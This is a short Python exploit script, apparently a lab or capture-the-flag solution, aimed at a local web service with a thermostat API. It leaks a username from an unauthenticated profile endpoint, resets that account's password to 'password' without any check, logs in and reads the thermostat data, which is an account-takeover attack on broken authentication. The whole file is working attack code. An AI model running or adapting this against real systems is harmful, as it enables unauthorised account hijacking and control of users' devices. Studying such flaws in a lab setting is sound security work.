#!/usr/bin/env python3
import requests

addr = "127.0.0.1"
port = 8000
url = "http://" + addr + ":" + str(port)
session = requests.session()
response = session.get(url + "/api/v1/profile")
username = response.json()[0]["username"]
print(username)
session.post(url + "/api/v1/change-password", json={
    "username": username,
    "password": "password"
})
session.post(url + "/api/v1/login", json={
    "username": username,
    "password": "password"
})
response = session.get(url + "/api/v1/thermostat")
print(response.json())
